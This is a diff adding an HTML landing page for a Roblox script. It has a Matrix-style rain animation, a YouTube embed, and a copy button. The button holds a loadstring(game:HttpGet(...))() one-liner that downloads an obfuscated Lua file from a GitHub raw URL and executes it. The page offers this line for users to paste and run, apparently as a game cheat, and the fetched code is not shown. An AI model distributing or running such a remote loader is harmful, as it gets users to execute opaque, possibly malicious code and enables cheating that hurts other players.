@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Matrix Rain Intro</title>
+  <style>
+    /* Fullscreen setup */
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    canvas {
+      display: block;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+
+    /* Introductory Text Styling */
+    .intro {
+      position: relative;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      z-index: 1;
+      top: 20px;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin: 0;
+      animation: fadeIn 3s ease-in-out;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin-top: 20px;
+      animation: fadeIn 5s ease-in-out;
+    }
+
+    /* Button Styling */
+    .copy-button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      background-color: #0f0;
+      border: none;
+      color: black;
+    }
+
+    /* Animation for text fade-in */
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+
+    /* YouTube Video Container */
+    .video-container {
+      margin-top: 40px;
+      display: flex;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+  <!-- Matrix Rain Background -->
+  <canvas id="matrix"></canvas>
+
+  <!-- Intro Text -->
+  <div class="intro">
+    <h1>Welcome to My World</h1>
+    <p>Hope you enjoy Roblox script</p>
+    
+    <!-- Copy Button -->
+    <h2>SCRIPT FOR CAT PIECE</h2>
+    <button class="copy-button" onclick="copyText(this)">loadstring(game:HttpGet("https://raw.githubusercontent.com/HA-arch-sketch/Tester/refs/heads/main/obf_2375Ka6cXlzluxp6rMVu3f4720p3sB9q7ON5N9t529BOFn9TCY2zt419fb21V3l0.lua.txt"))()</button>
+  </div>
+
+  <!-- YouTube Video Embed -->
+  <div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/P_-W8NZPYdU" frameborder="0" allowfullscreen></iframe>
+  </div>
+
+  <script>
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+
+    // Set canvas dimensions to fit the screen
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const fontSize = 16;
+    const columns = Math.floor(canvas.width / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      ctx.fillStyle = '#0f0';
+      ctx.font = `${fontSize}px monospace`;
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = String.fromCharCode(Math.random() * 128);
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height || Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+
+    setInterval(draw, 50);
+
+    // Adjust canvas size dynamically on resize
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      drops.length = Math.floor(canvas.width / fontSize);
+      drops.fill(1);
+    });
+
+    // Copy text function
+    function copyText(button) {
+      navigator.clipboard.writeText(button.innerText)
+        .then(() => {
+          alert('Script copied!');
+        })
+        .catch(err => {
+          console.error('Failed to copy: ', err);
+        });
+    }
+  </script>
+</body>
+</html>
